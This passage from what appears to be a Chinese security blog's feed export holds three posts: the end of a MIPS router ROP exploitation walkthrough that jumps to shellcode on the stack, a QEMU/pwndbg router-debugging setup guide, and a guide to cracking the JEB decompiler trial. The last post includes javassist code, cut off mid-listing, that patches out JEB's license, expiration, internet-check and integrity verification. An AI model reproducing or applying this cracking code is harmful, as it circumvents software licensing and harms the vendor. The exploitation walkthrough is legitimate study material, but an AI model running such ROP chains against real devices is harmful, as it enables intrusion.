<p>rop的过程，和对应的sp寄存器的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">sp:0x76fff710</div><div class="line">首先进入 rop_gad1， $s1 gadg_2</div><div class="line"></div><div class="line">sp:0x76fff710</div><div class="line">进入 gadg_2，这时$s1还是gadg_2， 从内存加载数据到寄存器s1--&gt;sleep, ra--&gt; rop_gad3, $s0---&gt;rop_gad4</div><div class="line"></div><div class="line">sp:0x76fff738</div><div class="line">再次进入 gadg_2,s1--&gt;sleep, ra--&gt; rop_gad3, $s0---&gt;rop_gad4</div><div class="line"></div><div class="line">sp:0x76fff760</div><div class="line">进入 rop_gad3， 获取栈地址到$s2,跳到 $s0</div><div class="line"></div><div class="line"></div><div class="line">进入rop_gad4，s2--&gt;0x76fff778 跳进栈中，。。。</div></pre></td></tr></table></figure></p>
<p><strong>gdb调试的部分截图</strong></p>
<p>断在函数返回地址被覆盖的时候，使用gdb命令，设置<code>$pc</code>寄存器的值，伪造劫持程序流程到 rop_gad1<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033066831ysbgu293.png?imageslim" alt="paste image"></p>
<p>汇编代码如下<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033106631mwc1gl07.png?imageslim" alt="paste image"></p>
<p>第一次进入rop_gad2<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090332319233l54m90b.png?imageslim" alt="paste image"></p>
<p>第二次运行到 rop_gad2 时的寄存器状态。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033335464zv8t8p6f.png?imageslim" alt="paste image"></p>
<p><code>t9</code> 指向 <code>sleep</code>函数，接下来调用 <code>sleep(1)</code> 刷新 <code>cache</code>, 便于后面指向 <code>shellcode</code>。次数的 <code>$ra</code> 为 <code>rop_gad3</code>的地址，便于在 <code>sleep</code> 返回后继续 <code>rop</code> ,获取一个栈的指针到寄存器，便于后面直接跳过去。</p>
<p>进入rop_gad3</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033654570mt5p9xro.png?imageslim" alt="paste image"></p>
<p>进入 rop_gad4,跳到栈上执行shellcode</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033720821o12bll0r.png?imageslim" alt="paste image"></p>
<p>分析完毕。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>修复环境要注意使用的gcc, 必要时自己跟踪，逆向代码，修复运行环境。看了几篇mips漏洞利用的文章，rop的思路就是上面的思路，估计那就是通用思路吧，记录下来，以备不时只需。调rop的过程还是有趣的。</p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 路由器安全 </tag>
            
            <tag> mips rop </tag>
            
            <tag> 路由器环境修复 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之环境搭建]]></title>
      <url>//%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>正式进入路由器的世界了。感觉路由器这块就是固件提取，运行环境修复比较麻烦，其他部分和一般的 pwn 差不多。由于大多数路由器是 mips 架构的，本文就以搭建  <code>MIPS运行、调试平台</code> 为例介绍环境的搭建。其他架构类似。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h6 id="安装-与-配置-Qemu"><a href="#安装-与-配置-Qemu" class="headerlink" title="安装 与 配置 Qemu:"></a>安装 与 配置 Qemu:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install qemu </div><div class="line">sudo apt-get install qemu-user-static</div><div class="line">sudo apt-get install qemu-system</div></pre></td></tr></table></figure>
<p>配置网络</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install bridge-utils uml-utilities</div></pre></td></tr></table></figure>
<p>修改 <code>/etc/network/interfaces</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">auto lo </div><div class="line">iface lo inet loopback </div><div class="line"># ubuntu 16.04的系统用ens33代替eth0 </div><div class="line">auto eth0 </div><div class="line">iface eth0  inet manual </div><div class="line">up ifconfig eth0  0.0.0.0 up </div><div class="line">auto br0</div><div class="line">iface br0 inet dhcp </div><div class="line">bridge_ports eth0 </div><div class="line">bridge_stp off </div><div class="line">bridge_maxwait 1</div></pre></td></tr></table></figure>
<p>修改 <code>/etc/qemu-ifup</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#!/bin/sh </div><div class="line">echo &quot;Executing /etc/qemu-ifup&quot; </div><div class="line">echo &quot;Bringing $1 for bridged mode...&quot; </div><div class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up </div><div class="line">echo &quot;Adding $1 to br0...&quot; </div><div class="line">sudo /sbin/brctl addif br0 $1 </div><div class="line">sleep 3</div></pre></td></tr></table></figure></p>
<p>增加权限   <code>chmod a+x /etc/qemu-ifup</code></p>
<p>重启网络服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/networking restart</div></pre></td></tr></table></figure></p>
<p><strong>下载与运行qemu的镜像</strong></p>
<p><em>uclibc交叉编译工具链 和 qemu系统镜像</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.uclibc.org/downloads/binaries/0.9.30.1/</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150902839201120b9a6l3.png?imageslim" alt="paste image"></p>
<p><em>运行示例（解压，运行即可）</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo qemu-system-mips -M malta -nographic -no-reboot -kernel &quot;zImage-mips&quot; -hda &quot;image-mips.ext2&quot; -append &quot;root=/dev/hda rw init=/usr/sbin/init.sh panic=1 PATH=/usr/bin console=ttyS0&quot; -net nic -net tap -drive file=/tmp/share.img</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509028462257nom8v9ce.png?imageslim" alt="paste image"></p>
<p><em>openwrt预先编译好的内核，mips小端</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://downloads.openwrt.org/snapshots/trunk/malta/generic/</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509028533709dnukk3fx.png?imageslim" alt="paste image"><br><em>运行</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo qemu-system-mipsel -kernel openwrt-malta-le-vmlinux-initramfs.elf -M malta  -drive file=/tmp/share.img -net nic -net tap -nographic</div></pre></td></tr></table></figure></p>
<p> <em>debian mips qemu镜像 </em><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://people.debian.org/~aurel32/qemu/mips/</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509028870417m16zceue.png?imageslim" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap -nographic</div></pre></td></tr></table></figure>
<p>时间比较长<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090291042864rohh3lo.png?imageslim" alt="paste image"></p>
<h4 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h4><p>一个类似于 peda的gdb插件，支持多种架构，pwn最强gdb插件。用了它之后发现ida的调试简直渣渣。一张图说明一切。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090290758339f3u420n.png?imageslim" alt="paste image"><br>安装的话按照github上的说明即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/pwndbg/pwndbg</div></pre></td></tr></table></figure></p>
<p>要用来调试MIPS的话，要安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt install gdb-multiarch</div></pre></td></tr></table></figure></p>
<p>然后按照正常的gdb使用就行。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509029269607h15gm0sd.png?imageslim" alt="paste image"></p>
<h4 id="安装firmadyne"><a href="#安装firmadyne" class="headerlink" title="安装firmadyne"></a>安装firmadyne</h4><p>一个路由器运行环境，傻瓜化操作，但是无法调试……<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/firmadyne/firmadyne</div></pre></td></tr></table></figure></p>
<h4 id="安装mipsrop插件"><a href="#安装mipsrop插件" class="headerlink" title="安装mipsrop插件"></a>安装mipsrop插件</h4><p>貌似其他的rop工具都不能检测处mips的 gadgets,这个不错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/devttys0/ida/tree/master/plugins/mipsrop</div></pre></td></tr></table></figure></p>
<p>扔到ida的plug目录即可</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509029647708zje4hzns.png?imageslim" alt="paste image"></p>
<h4 id="安装-PleaseROP-插件"><a href="#安装-PleaseROP-插件" class="headerlink" title="安装 PleaseROP 插件"></a>安装 PleaseROP 插件</h4><p>jeb 2.3+ 的适用于arm , mips通用 rop gadgets搜索插件<br><a href="https://github.com/pnfsoftware/PleaseROP" target="_blank" rel="external">PleaseROP</a></p>
<p>下载后放到jeb根目录的 <code>coreplugins</code> 目录下，重新打开Jeb即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509090395335ni62umpx.png?imageslim" alt="paste image"></p>
<p>找到的结果可以在下面位置找到</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509090463437ew1n3zjs.png?imageslim" alt="paste image"></p>
<h4 id="binwalk完整安装"><a href="#binwalk完整安装" class="headerlink" title="binwalk完整安装"></a>binwalk完整安装</h4><p>一定要安装完整的版本不然有些固件解不了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://blog.csdn.net/qq1084283172/article/details/65441110</div></pre></td></tr></table></figure></p>
<h4 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h4><p>各种平台的静态编译版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/mzpqnxow/embedded-toolkit</div></pre></td></tr></table></figure></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>很简单，就这样</p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 路由器安全 </tag>
            
            <tag> mips rop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java应用破解之破解 jeb mips 2.3.3 ]]></title>
      <url>//jeb%E7%A0%B4%E8%A7%A3/2017-10-23-java%E5%BA%94%E7%94%A8%E7%A0%B4%E8%A7%A3%E4%B9%8B%E7%A0%B4%E8%A7%A3-jeb-mips-2-3-3.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于要去学习路由器相关的漏洞利用技术的学习，而许多的路由器都是 <code>mips架构</code>  的，<code>IDA</code> 又不能反编译 <code>mips</code> , 发现 <code>jeb</code> 的新版支持 <code>mips的反编译</code> ，于是去官网申请一个试用版，试用版的限制还是比较多的，比如 <code>使用时间验证</code>，<code>没法复制粘贴</code> 等，于是想尝试看看能否破解，同时填了 <code>java破解</code> 这个坑。</p>
<hr>
<p>本文主要记录的是破解过程中的思路和使用的一些工具，技巧。文末有处理后的数据。</p>
<hr>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>  <code>jeb</code> 的主要逻辑在 <code>jeb.jar</code> 中，该文件会在程序运行起来后释放到程序目录中的其中一个子目录下，使用 <code>Everything</code> 搜 <code>jeb.jar</code> 就可以找到文件的位置。找到文件后就可以逆向分析了。本文重点不在逆向这方面，而是要介绍我破解这个软件的一个大概的流程。</p>
<p>  下面介绍几个在整个流程中起到重要作用的工具。</p>
<ul>
<li><code>Btrace</code>  —-&gt; hook java系统函数，打印堆栈，找关键方法</li>
<li><code>javassist</code> —-&gt;  修改字节码</li>
<li><code>IDEA</code> ——&gt;  动态调试jar包</li>
</ul>
<p>试用版的一个最无语的限制就是必须要联网才能使用，不联网就会直接退出了，就是如此暴力。但是这对我们来说则是绝佳的条件。我们可以使用 Btrace <code>hook java.lang.System.exit</code> 函数，然后打印堆栈信息，就可以定位到在退出前所调用的方法，一般来说，在方法之间肯定会有离关键方法很近的方法，或者直接就是我们要找的目标方法。<br>这个是之前破解的，现在我重新测试时，提示 <code>超过试用期</code>，然后就退出了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820496115nl8oskut.png?imageslim" alt="paste image"></p>
<p>不管怎样有异常就好，然后hook  <code>java.lang.System.exit</code> 打印堆栈信息就可以看到一些jeb自己写一些方法的的信息了。</p>
<p>Btrace脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import com.sun.btrace.annotations.*;  </div><div class="line">import static com.sun.btrace.BTraceUtils.*;  </div><div class="line"></div><div class="line">@BTrace</div><div class="line">public class TraceHelloWorld &#123;</div><div class="line">		@OnMethod</div><div class="line">		(clazz = &quot;java.lang.System&quot;, method = &quot;exit&quot;)</div><div class="line">		public static void Trace_exit()</div><div class="line">		&#123;</div><div class="line">			println( &quot;jstack() is :&quot; );</div><div class="line">			println( &quot;[&quot; );</div><div class="line">			jstack();</div><div class="line">			println( &quot;]&quot; );</div><div class="line">		&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820717781912l6lzi.png?imageslim" alt="paste image"></p>
<p>这里有个小问题,如果你是通过运行jeb_wincon.bat 或者 jeb.exe来启动jeb的话你是看不到他开启的 java进程的，所以可以使用 <code>everything</code> 搜索<code>org.eclipse.equinox.launcher*jar</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820877604x2xuse0y.png?imageslim" alt="paste image"></p>
<p>然后运行那个 jar 包就可以正常的找到 <code>jeb启动的 java 进程</code> 了，这样我们才可以使用 Btrace 脚本进行 hook. 至于为什么是这样的，我也不记得当初是怎样找到的。可以去逆向 <code>jeb.exe</code> 或者 看使用 <code>org.eclipse.equinox</code> 开发的教程可以弄清楚。其实通过 <code>Btrace</code> 然后配合着静态分析就可以解决这个软件了我认为。</p>
<p>Jeb里面会使用一个函数对字符串进行加密，所以在逆向的时候会很不方便，当初我是用 IDEA 调试它，然后 在 IDEA 的调试环境里面，调用解密函数(使用IDEA的自带的功能)，把加密后的字符串解密后，然后再分析的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15088226254701n26it6w.png?imageslim" alt="paste image"></p>
<p>使用IDEA调试其实非常简单，我们只需要先新建一个 project , 然后把相关的jar包添加到 Project 的 lib, 然后调用 jar 包中的函数即可。比如</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508821465891r2f5xrjy.png?imageslim" alt="paste image"></p>
<p>信息比较杂，看我画圈的那段代码即可。然后进入想要下断点的位置，正常的下个断点就可以了。</p>
<p>比如我们已经知道，程序权限校验的关键逻辑在 jeb.jar中，我们直接调用 jeb.jar中的 main 方法，然后进去调试里面的代码即可</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508821704636jxtite92.png?imageslim" alt="paste image"></p>
<p>赏心悦目的调试，美滋滋。分析或者调试 <code>jeb.jar</code> ，就可以找到 字符串加密的那个方法。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508822313678ssj9on8b.png?imageslim" alt="paste image"><br>如果没有目标，我们可以使用 Btrace hook 这个函数，打印他的返回值，就可以看到程序中各种被解密后的字符串了。脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">import static com.sun.btrace.BTraceUtils.println;</div><div class="line">import static com.sun.btrace.BTraceUtils.str;</div><div class="line">import static com.sun.btrace.BTraceUtils.strcat;</div><div class="line">import static com.sun.btrace.BTraceUtils.timeMillis;</div><div class="line">import static com.sun.btrace.BTraceUtils.jstack;</div><div class="line"></div><div class="line"></div><div class="line">import com.sun.btrace.annotations.BTrace;</div><div class="line">import com.sun.btrace.annotations.Kind;</div><div class="line">import com.sun.btrace.annotations.Location;</div><div class="line">import com.sun.btrace.annotations.OnMethod;</div><div class="line"></div><div class="line">@BTrace</div><div class="line">public class TraceHelloWorld &#123;</div><div class="line">		@OnMethod</div><div class="line">		(clazz = &quot;com.pnfsoftware.jebglobal.GN&quot;, method = &quot;dL&quot;)</div><div class="line">		public static void Trace_exit()</div><div class="line">		&#123;</div><div class="line">			println( &quot;ret is :   &quot; );</div><div class="line">			println( &quot;[&quot; );</div><div class="line">			jstack();</div><div class="line">			println( &quot;]&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">			println( &quot;-------------------------------------------------------&quot; );</div><div class="line">		&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>经过各种翻看代码，调试， Hook, 终于找到一些可能是比较关键的函数，我们该怎么办呢？ 这时可以使用 <code>javassist</code> 来修改目标 方法。<br>比较懒，把破解 JEB 期间的所有代码都放到 一个 函数里面了，做了一定的注释。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div></pre></td><td class="code"><pre><div class="line">package me.hacklh;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.Launcher;</div><div class="line">import javassist.ClassPool;</div><div class="line">import javassist.CtClass;</div><div class="line">import javassist.CtMethod;</div><div class="line">import javassist.CtNewMethod;</div><div class="line">import com.pnfsoftware.jeb.installer.*;</div><div class="line">import org.eclipse.core.launcher.Main;</div><div class="line">import com.pnfsoftware.jeb.client.Licensing;</div><div class="line"></div><div class="line"></div><div class="line">public class JebCracker &#123;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line"></div><div class="line">//        com.pnfsoftware.jeb.installer.Launcher.main(new String[]&#123;&quot;--di&quot;&#125;);</div><div class="line">//        DES.main(args);</div><div class="line">         Launcher.main(new String[]&#123;&quot;--generate-key&quot;&#125;);</div><div class="line">        CtClass.debugDump = &quot;./debugDump/&quot;;</div><div class="line"></div><div class="line">        System.out.println(Licensing.allowAnyClient());</div><div class="line"></div><div class="line">//        Main.main(args);</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 修改安装时的校验, 避免去下载网络安装文件，直接使用我们事先下好的文件就行</div><div class="line">         */</div><div class="line">        ClassPool pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.installer&quot;);</div><div class="line">        CtClass old_class = pool.get(&quot;com.pnfsoftware.jeb.installer.Package&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        CtMethod old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;verifyData&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(byte[].class.getName()),</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line">        /**</div><div class="line">         * 修改getStatus， AbstractContext会起几个线程修改status</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getStatus&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return 0;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;terminate&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * internet 检测</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jebglobal.tB&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jebglobal.tB&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;dL&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(boolean.class.getName()),</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;run&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 增加许可证的过期时间</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.Licensing&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.client.Licensing&quot;);</div><div class="line">        old_class.detach();</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getExpirationTimestamp&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return real_license_ts + 345600000;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;isInternetRequired&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return false;&quot;);</div><div class="line"></div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;isFullBuild&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;canUseCoreAPI&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;canUseCoreAPI&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return true;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line">        /**</div><div class="line">         * patch 掉与网络下载有关的函数，禁止升级</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;downloadBinary&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line"></div><div class="line">        old_method = 